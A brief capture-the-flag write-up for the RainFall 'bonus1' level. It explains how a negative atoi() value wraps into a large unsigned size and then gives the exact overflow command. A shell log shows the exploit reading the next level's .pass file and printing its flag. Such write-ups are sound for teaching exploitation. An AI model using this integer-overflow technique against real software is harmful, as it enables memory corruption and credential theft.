In C, atoi() returns a signed int. Signed integers go from:

INT_MIN = -2147483648 to INT_MAX = 2147483647

But memory works in unsigned 32-bit, which goes from 0 to 4294967295 (0xFFFFFFFF).

If we input a negative number, its bit representation will still be interpreted as a large unsigned number during operations like input_length * 4.


./bonus1 -1073741810 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW


```
    bonus1@RainFall:~$ ./bonus1 -1073741810 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW
    $ cat /home/user/bonus2/.pass
    579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```